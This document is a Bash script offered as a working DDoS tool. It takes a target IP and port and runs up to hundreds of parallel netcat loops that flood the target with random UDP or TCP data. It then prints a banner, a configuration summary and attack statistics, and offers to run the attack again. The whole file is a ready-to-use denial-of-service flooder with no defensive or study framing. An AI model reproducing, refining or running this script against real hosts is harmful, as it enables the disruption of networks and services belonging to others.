#!/bin/bash

# Simple Bash DDoS Tool - Working Version
# Code by Lee0n123

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to show banner
show_banner() {
    echo -e "${RED}"
    echo "╔═══════════════════════════════════╗"
    echo "║   SIMPLE DDoS TOOL - BASH EDITION ║"
    echo "║         Code by Lee0n123          ║"
    echo "╚═══════════════════════════════════╝"
    echo -e "${NC}"
}

# Function to show help
show_help() {
    echo "Usage: $0 [OPTIONS]"
    echo
    echo "Required:"
    echo "  -i, --ip        Target IP address"
    echo "  -p, --port      Target port"
    echo
    echo "Options:"
    echo "  -m, --mode      Attack mode (udp/tcp) [default: udp]"
    echo "  -t, --threads   Number of threads [default: 100]"
    echo "  -s, --size      Packet size in bytes [default: 1024]"
    echo "  -c, --count     Packets per thread [default: 1000]"
    echo "  -h, --help      Show this help"
    echo
    echo "Examples:"
    echo "  $0 -i 192.168.1.1 -p 80"
    echo "  $0 -i 10.0.0.1 -p 443 -m tcp -t 50"
}

# Default values
IP=""
PORT=""
MODE="udp"
THREADS=100
SIZE=1024
COUNT=1000

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--ip)
            IP="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -m|--mode)
            MODE="$2"
            shift 2
            ;;
        -t|--threads)
            THREADS="$2"
            shift 2
            ;;
        -s|--size)
            SIZE="$2"
            shift 2
            ;;
        -c|--count)
            COUNT="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${NC}"
            show_help
            exit 1
            ;;
    esac
done

# Check if IP and PORT are provided
if [[ -z "$IP" || -z "$PORT" ]]; then
    echo -e "${RED}[!] Error: IP and Port are required!${NC}"
    echo
    show_help
    exit 1
fi

# Validate mode
if [[ "$MODE" != "udp" && "$MODE" != "tcp" ]]; then
    echo -e "${RED}[!] Error: Mode must be 'udp' or 'tcp'${NC}"
    exit 1
fi

# Show banner
show_banner

# Display configuration
echo -e "${GREEN}[*] Configuration:${NC}"
echo -e "  Target:    $IP:$PORT"
echo -e "  Mode:      $MODE"
echo -e "  Threads:   $THREADS"
echo -e "  Packet:    ${SIZE} bytes"
echo -e "  Count:     $COUNT packets/thread"
echo

# Check if netcat is installed
if ! command -v nc &> /dev/null; then
    echo -e "${RED}[!] Error: netcat (nc) is not installed${NC}"
    echo "Install it using:"
    echo "  Ubuntu/Debian: sudo apt install netcat"
    echo "  CentOS/RHEL: sudo yum install nc"
    exit 1
fi

# Function for UDP attack
attack_udp() {
    local thread_id=$1
    local data_file="/tmp/ddos_data_$thread_id.bin"
    
    # Generate random data file
    head -c $SIZE /dev/urandom > "$data_file"
    
    local sent=0
    while [[ $sent -lt $COUNT ]]; do
        # Send UDP packet
        nc -u -w 0 "$IP" "$PORT" < "$data_file" 2>/dev/null &
        ((sent++))
        
        # Send multiple packets in batches for speed
        if [[ $((sent % 10)) -eq 0 ]]; then
            wait 2>/dev/null
        fi
    done
    
    # Wait for all background processes
    wait 2>/dev/null
    
    # Clean up
    rm -f "$data_file"
    
    echo -e "${GREEN}[+] Thread $thread_id: Sent $sent packets${NC}"
}

# Function for TCP attack
attack_tcp() {
    local thread_id=$1
    local data_file="/tmp/ddos_data_$thread_id.bin"
    
    # Generate smaller data for TCP
    head -c 512 /dev/urandom > "$data_file"
    
    local sent=0
    while [[ $sent -lt $COUNT ]]; do
        # Try to establish TCP connection
        timeout 1 nc -w 1 "$IP" "$PORT" < "$data_file" 2>/dev/null &
        ((sent++))
        
        # Control rate
        sleep 0.01
    done
    
    wait 2>/dev/null
    rm -f "$data_file"
    
    echo -e "${BLUE}[+] Thread $thread_id: Sent $sent TCP packets${NC}"
}

# Attack function
start_attack() {
    echo -e "${YELLOW}[*] Starting attack in 3 seconds...${NC}"
    sleep 3
    
    local start_time=$(date +%s)
    local pids=()
    
    echo -e "${YELLOW}[*] Launching $THREADS threads...${NC}"
    
    # Start all threads
    for ((i=1; i<=THREADS; i++)); do
        if [[ "$MODE" == "udp" ]]; then
            attack_udp $i &
        else
            attack_tcp $i &
        fi
        pids+=($!)
        
        # Don't start all threads at once
        if [[ $((i % 50)) -eq 0 ]]; then
            sleep 0.1
        fi
    done
    
    # Wait for all threads to complete
    echo -e "${YELLOW}[*] Waiting for threads to complete...${NC}"
    wait "${pids[@]}" 2>/dev/null
    
    local end_time=$(date +%s)
    local duration=$((end_time - start_time))
    local total_packets=$((THREADS * COUNT))
    
    echo
    echo -e "${GREEN}════════════════════════════════════════${NC}"
    echo -e "${GREEN}[+] Attack completed!${NC}"
    echo -e "${GREEN}[+] Duration: $duration seconds${NC}"
    echo -e "${GREEN}[+] Total packets sent: $total_packets${NC}"
    echo -e "${GREEN}[+] Average rate: $((total_packets / duration)) packets/sec${NC}"
    echo -e "${GREEN}════════════════════════════════════════${NC}"
}

# Start the attack
start_attack

# Option to run again
echo
read -p "Run attack again? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    start_attack
else
    echo -e "${YELLOW}[*] Exiting...${NC}"
fi
